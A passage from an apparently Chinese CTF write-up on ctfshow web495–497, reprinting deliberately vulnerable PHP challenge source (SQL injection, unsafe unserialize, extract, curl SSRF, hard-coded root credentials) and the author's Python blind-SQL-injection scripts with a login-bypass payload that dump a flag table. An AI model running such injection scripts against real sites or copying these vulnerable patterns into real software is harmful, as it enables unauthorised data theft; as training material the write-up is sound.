 Last Modified by:   h1xa
 Last Modified time: 2021-03-13 19:59:12
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();
include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);


$action=$_GET[&#39;action&#39;];
if(!isset($action))&#123;
    if(isset($_COOKIE[&#39;user&#39;]))&#123;
        $c=$_COOKIE[&#39;user&#39;];
        if(preg_match(&#39;/\:|\,/&#39;, $c))&#123;
            $user=unserialize($c);
        &#125;
        if($user)&#123;
            templateUtil::render(&#39;index&#39;);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
    &#125;else&#123;
        header(&#39;location:index.php?action=login&#39;);
    &#125;
    die();    
&#125;

if($action==&#39;check&#39;)&#123;
    extract($_GET);
    if(!preg_match(&#39;/or|and|innodb|sys/i&#39;, $username))&#123;
        $sql = &quot;select username from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;
        $db=new db();
        $user=$db-&gt;select_one_array($sql);
    &#125;
    if($user)&#123;
        setcookie(&#39;user&#39;,$user);
        templateUtil::render(&#39;index&#39;,$user);
    &#125;else&#123;
        templateUtil::render(&#39;error&#39;);
    &#125;
&#125;
if($action==&#39;clear&#39;)&#123;
    system(&#39;rm -rf cache/*&#39;);
    die(&#39;cache clear&#39;);
&#125;

if($action==&#39;login&#39;)&#123;
    templateUtil::render($action);
&#125;else&#123;
    templateUtil::render($action);
&#125;
</code></pre>
<p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-13 20:01:31
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        if(cache::cache_exists($template))&#123;
            echo cache::get_cache($template);
        &#125;else&#123;
            $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
            $cache=templateUtil::shade($templateContent,$arg);
            cache::create_cache($template,$cache);
            echo $cache;
        &#125;
    &#125;
    public static  function shade($templateContent,$arg=array())&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

&#125;



</code></pre>
<p>render&#x2F;db_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:43:40
 Last Modified by:   h1xa
 Last Modified time: 2021-03-12 17:43:56
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class db&#123;
    
    public $db;
    public $log;
    public $sql;
    public $username=&#39;root&#39;;
    public $password=&#39;root&#39;;
    public $port=&#39;3306&#39;;
    public $addr=&#39;127.0.0.1&#39;;
    public $database=&#39;ctfshow&#39;;
    public function __construct()&#123;
        $this-&gt;log=new dbLog();
        $this-&gt;db=$this-&gt;getConnection();
    &#125;

    public function getConnection()&#123;
         
        return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);
    &#125;

    public  function select_one($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $result=$conn-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_object();
        &#125;

    &#125;
    public  function select_one_array($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $result=$conn-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_assoc();
        &#125;

    &#125;
    public function __destruct()&#123;
        $this-&gt;log-&gt;log($this-&gt;sql);
    &#125;
&#125;
class dbLog&#123;
    public $sql;
    public $content;
    public $log;

    public function __construct()&#123;
        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;
    &#125;
    public function log($sql)&#123;
        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;
    &#125;
    public function __destruct()&#123;
        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
    &#125;
&#125;


</code></pre>
<p>file_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:56:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 14:08:48
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class fileUtil&#123;

    public static function read($filename)&#123;
        return file_get_contents($filename);
    &#125;

    public static function write($filename,$content,$append =0)&#123;
        if($append)&#123;
            file_put_contents($filename, $content,FILE_APPEND);
        &#125;else&#123;
            file_put_contents($filename, $content);
        &#125;
    &#125;
&#125;
</code></pre>
<p>cache_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:49:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-13 20:02:23
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


class cache&#123;
    public static function create_cache($template,$content)&#123;
        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;))&#123;
            return true;
        &#125;else&#123;
            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.html&#39;,$content);
        &#125;
    &#125;
    public static function get_cache($template)&#123;
        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
    &#125;
    public static function cache_exists($template)&#123;
        return file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
    &#125;

&#125;
</code></pre>
<p>为啥没变化,上一题脚本直接过.发现flag没有,可以直接通过蚁剑连接数据库,毕竟我们已经知道用户名和密码了</p>
<p>要填127.0.0.1哦</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411223652378.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411223652378"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411223730608.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220411223730608"></p>

<h1 id="web496"><a href="#web496" class="headerlink" title="web496"></a>web496</h1><p>index.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 05:42:14
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();
include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);


$action=$_GET[&#39;action&#39;];


if(!isset($action))&#123;
    if(isset($_COOKIE[&#39;user&#39;]))&#123;
        $c=$_COOKIE[&#39;user&#39;];
        if(preg_match(&#39;/\:|\,/&#39;, $c))&#123;
            #$user=unserialize($c);
        &#125;
        if($user)&#123;
            templateUtil::render(&#39;index&#39;);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
    &#125;else&#123;
        header(&#39;location:index.php?action=login&#39;);
    &#125;
    die();    
&#125;

switch ($action) &#123;
    case &#39;check&#39;:
        $username=$_POST[&#39;username&#39;];
        $password=$_POST[&#39;password&#39;];
        if(!preg_match(&#39;/or|file|innodb|sys|mysql/i&#39;, $username))&#123;
            $sql = &quot;select username,nickname from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;
            $db=new db();
            $user=$db-&gt;select_one_array($sql);
        &#125;
        if($user)&#123;
            $_SESSION[&#39;user&#39;]=$user;
            header(&#39;location:index.php?action=index&#39;);
        &#125;else&#123;
            templateUtil::render(&#39;error&#39;);
        &#125;
        break;
    case &#39;clear&#39;:
        system(&#39;rm -rf cache/*&#39;);
        die(&#39;cache clear&#39;);
        break;
    case &#39;login&#39;:
        templateUtil::render($action);
        break;
    case &#39;index&#39;:
        $user=$_SESSION[&#39;user&#39;];
        if($user)&#123;
            templateUtil::render(&#39;index&#39;,$user);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
        break;
    case &#39;view&#39;:
        $user=$_SESSION[&#39;user&#39;];
        if($user)&#123;
            templateUtil::render($_GET[&#39;page&#39;],$user);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
        break;
    case &#39;logout&#39;:
        session_destroy();
        header(&#39;location:index.php?action=login&#39;);
        break;
    default:
        templateUtil::render($action);
        break;
&#125;

</code></pre>
<p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-14 09:23:59
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
        $cache=templateUtil::shade($templateContent,$arg);
        echo $cache;
    &#125;
    public static  function shade($templateContent,$arg=array())&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

&#125;



</code></pre>
<p>render&#x2F;db_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:43:40
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 05:02:27
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class db&#123;
    
    public $db;
    public $log;
    public $sql;
    public $username=&#39;root&#39;;
    public $password=&#39;root&#39;;
    public $port=&#39;3306&#39;;
    public $addr=&#39;127.0.0.1&#39;;
    public $database=&#39;ctfshow&#39;;
    public function __construct()&#123;
        $this-&gt;log=new dbLog();
        $this-&gt;db=$this-&gt;getConnection();
    &#125;

    public function getConnection()&#123;
         
        return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);
    &#125;

    public  function select_one($sql)&#123;
        $this-&gt;sql=$sql;
        $result=$this-&gt;db-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_object();
        &#125;

    &#125;
    public  function select_one_array($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $result=$this-&gt;db-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_assoc();
        &#125;
    &#125;
    public function update_one($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $this-&gt;db-&gt;query($sql);
        return $this-&gt;db-&gt;affected_rows;
    &#125;

    public function __destruct()&#123;
        $this-&gt;log-&gt;log($this-&gt;sql);
    &#125;
&#125;
class dbLog&#123;
    public $sql;
    public $content;
    public $log;

    public function __construct()&#123;
        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;
    &#125;
    public function log($sql)&#123;
        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;
    &#125;
    public function __destruct()&#123;
        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
    &#125;
&#125;


</code></pre>
<p>file_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:56:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 14:08:48
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class fileUtil&#123;

    public static function read($filename)&#123;
        return file_get_contents($filename);
    &#125;

    public static function write($filename,$content,$append =0)&#123;
        if($append)&#123;
            file_put_contents($filename, $content,FILE_APPEND);
        &#125;else&#123;
            file_put_contents($filename, $content);
        &#125;
    &#125;
&#125;
</code></pre>
<p>cache_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:49:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-13 20:02:23
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


class cache&#123;
    public static function create_cache($template,$content)&#123;
        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;))&#123;
            return true;
        &#125;else&#123;
            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.html&#39;,$content);
        &#125;
    &#125;
    public static function get_cache($template)&#123;
        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
    &#125;
    public static function cache_exists($template)&#123;
        return file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
    &#125;

&#125;
</code></pre>
<p>这次发现登录之后会进入index页面,我们这里直接进行登录</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182606641.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413182606641"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182616097.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413182616097"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182939258.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413182939258"></p>

<p>发现也就一个view有用</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413183106690.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413183106690"></p>

<p>又搜到一个.php文件</p>
<p>admin_edit.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-15 04:27:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 05:36:01
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();
include(&#39;../render/db_class.php&#39;);

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    extract($_POST);
    $sql = &quot;update user set nickname=&#39;&quot;.substr($nickname, 0,8).&quot;&#39; where username=&#39;&quot;.$user[&#39;username&#39;].&quot;&#39;&quot;;
    $db=new db();
    if($db-&gt;update_one($sql))&#123;
        $_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;
        $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
    &#125;else&#123;
        $ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;
    &#125;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;



</code></pre>
<pre><code class="php">import random

import requests
url = &quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/api/admin_edit.php&quot;
login = &quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/index.php?action=check&quot;
data = &#123;
    &quot;username&quot; :&quot;1&#39;||1=1#&quot;,
    &quot;password&quot;:&#39;1&#39;,
    &#39;action&#39;:&#39;check&#39;
&#125;
session = requests.session()
session.post(login,data=data,proxies=&#123;&quot;http&quot;:&quot;http://127.0.0.1:8081&quot;&#125;)

payload = &quot;if(ascii(substr((select database()),1,1))=0,1,0)&quot; #错误
payload = &quot;if(ascii(substr((select database()),1,1))&gt;0,1,0)&quot; #正确
date = &#123;
    &quot;user[username]&quot;: f&quot;1&#39; or &#123;payload&#125;#&quot;,
    &#39;nickname&#39;: f&quot;&#123;random.randint(1,10000)&#125;&quot;
&#125;

r = session.post(url, data=date)
print(r.json())
</code></pre>
<pre><code class="php">import random

import requests
url = &quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/api/admin_edit.php&quot;
login = &quot;http://3e4559fb-80d2-422f-bc45-181f5d5a6d3c.challenge.ctf.show/index.php?action=check&quot;
data = &#123;
    &quot;username&quot; :&quot;1&#39;||1=1#&quot;,
    &quot;password&quot;:&#39;1&#39;,
    &#39;action&#39;:&#39;check&#39;
&#125;
session = requests.session()
session.post(login,data=data,proxies=&#123;&quot;http&quot;:&quot;http://127.0.0.1:8081&quot;&#125;)
result =&quot;&quot;
i = 0
while 1:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # 查数据库  flagyoudontknow76
        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        # 查表名
        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;flagyoudontknow76&#39;&quot;
        # 查数据
        payload = &quot;select flagisherebutyouneverknow118 from flagyoudontknow76&quot;
        date = &#123;
            &quot;user[username]&quot;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;,
            &#39;nickname&#39;: f&quot;&#123;random.randint(1,100000)&#125;&quot;
        &#125;
        r = session.post(url, data=date)
        #print(r.json())
        if &quot;管理员信息修改成功&quot; == r.json()[&#39;msg&#39;]:
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        result += chr(head)
    else:
        break
    print(result)

</code></pre>
<h1 id="web497"><a href="#web497" class="headerlink" title="web497"></a>web497</h1><p>index.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 07:34:08
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();
include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);


$action=$_GET[&#39;action&#39;];


if(!isset($action))&#123;
    if(isset($_COOKIE[&#39;user&#39;]))&#123;
        $c=$_COOKIE[&#39;user&#39;];
        if(!preg_match(&#39;/\:|\,/&#39;, $c))&#123;
            $user=unserialize($c);
        &#125;
        if($user)&#123;
            templateUtil::render(&#39;index&#39;);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
    &#125;else&#123;
        header(&#39;location:index.php?action=login&#39;);
    &#125;
    die();    
&#125;

switch ($action) &#123;
    case &#39;check&#39;:
        $username=$_POST[&#39;username&#39;];
        $password=$_POST[&#39;password&#39;];
        if(!preg_match(&#39;/file|or|innodb|sys|mysql/i&#39;, $username))&#123;
            $sql = &quot;select username,nickname,avatar from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;
            $db=new db();
            $user=$db-&gt;select_one_array($sql);
        &#125;
        if($user)&#123;
            $_SESSION[&#39;user&#39;]=$user;
            header(&#39;location:index.php?action=index&#39;);
        &#125;else&#123;
            templateUtil::render(&#39;error&#39;);
        &#125;
        break;
    case &#39;clear&#39;:
        system(&#39;rm -rf cache/*&#39;);
        die(&#39;cache clear&#39;);
        break;
    case &#39;login&#39;:
        templateUtil::render($action);
        break;
    case &#39;index&#39;:
        $user=$_SESSION[&#39;user&#39;];
        if($user)&#123;
            templateUtil::render(&#39;index&#39;,$user);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
        break;
    case &#39;view&#39;:
        $user=$_SESSION[&#39;user&#39;];
        if($user)&#123;
            templateUtil::render($_GET[&#39;page&#39;],$user);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
        break;
    case &#39;logout&#39;:
        session_destroy();
        header(&#39;location:index.php?action=login&#39;);
        break;
    default:
        templateUtil::render($action);
        break;
&#125;

</code></pre>
<p>render&#x2F;db_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:43:40
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 05:02:27
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class db&#123;
    
    public $db;
    public $log;
    public $sql;
    public $username=&#39;root&#39;;
    public $password=&#39;root&#39;;
    public $port=&#39;3306&#39;;
    public $addr=&#39;127.0.0.1&#39;;
    public $database=&#39;ctfshow&#39;;
    public function __construct()&#123;
        $this-&gt;log=new dbLog();
        $this-&gt;db=$this-&gt;getConnection();
    &#125;

    public function getConnection()&#123;
         
        return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database);
    &#125;

    public  function select_one($sql)&#123;
        $this-&gt;sql=$sql;
        $result=$this-&gt;db-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_object();
        &#125;

    &#125;
    public  function select_one_array($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $result=$this-&gt;db-&gt;query($sql);
        if($result)&#123;
            return $result-&gt;fetch_assoc();
        &#125;
    &#125;
    public function update_one($sql)&#123;
        $this-&gt;sql=$sql;
        $conn = db::getConnection();
        $this-&gt;db-&gt;query($sql);
        return $this-&gt;db-&gt;affected_rows;
    &#125;

    public function __destruct()&#123;
        $this-&gt;log-&gt;log($this-&gt;sql);
    &#125;
&#125;
class dbLog&#123;
    public $sql;
    public $content;
    public $log;

    public function __construct()&#123;
        $this-&gt;log=&#39;log/&#39;.date_format(date_create(),&quot;Y-m-d&quot;).&#39;.txt&#39;;
    &#125;
    public function log($sql)&#123;
        $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;
    &#125;
    public function __destruct()&#123;
        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
    &#125;
&#125;


</code></pre>
<p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 08:40:19
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
        $cache=templateUtil::shade($templateContent,$arg);
        echo $cache;
    &#125;
    public static  function shade($templateContent,$arg=array())&#123;
        $templateContent=templateUtil::checkImage($templateContent,$arg);
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

    public static function checkImage($templateContent,$arg=array())&#123;
        foreach ($arg as $key =&gt; $value) &#123;

            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;
                $encode=&#39;&#39;;
                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;
                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
                &#125;else&#123;
                    $ch=curl_init($value);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    $result=curl_exec($ch);
                    curl_close($ch);
                    $ret=chunk_split(base64_encode($result));
                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
                &#125;
                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;

&#125;



</code></pre>
<p>file_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:56:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-09 14:08:48
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

error_reporting(0);
class fileUtil&#123;

    public static function read($filename)&#123;
        return file_get_contents($filename);
    &#125;

    public static function write($filename,$content,$append =0)&#123;
        if($append)&#123;
            file_put_contents($filename, $content,FILE_APPEND);
        &#125;else&#123;
            file_put_contents($filename, $content);
        &#125;
    &#125;
&#125;
</code></pre>
<p>cache_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 20:49:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-13 20:02:23
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


class cache&#123;
    public static function create_cache($template,$content)&#123;
        if(file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;))&#123;
            return true;
        &#125;else&#123;
            fileUtil::write(&#39;cache/&#39;.md5($template).&#39;.html&#39;,$content);
        &#125;
    &#125;
    public static function get_cache($template)&#123;
        return fileUtil::read(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
    &#125;
    public static function cache_exists($template)&#123;
        return file_exists(&#39;cache/&#39;.md5($template).&#39;.html&#39;);
    &#125;

&#125;
</code></pre>
<p>api&#x2F;admin_edit.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-15 04:27:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 07:45:25
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();
include(&#39;../render/db_class.php&#39;);

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    extract($_POST);
    $user= $_SESSION[&#39;user&#39;];
    if(preg_match(&#39;/\&#39;|\&quot;|\\\/&#39;, $avatar))&#123;
        $ret[&#39;msg&#39;]=&#39;存在无效字符&#39;;
        die(json_encode($ret));
    &#125;
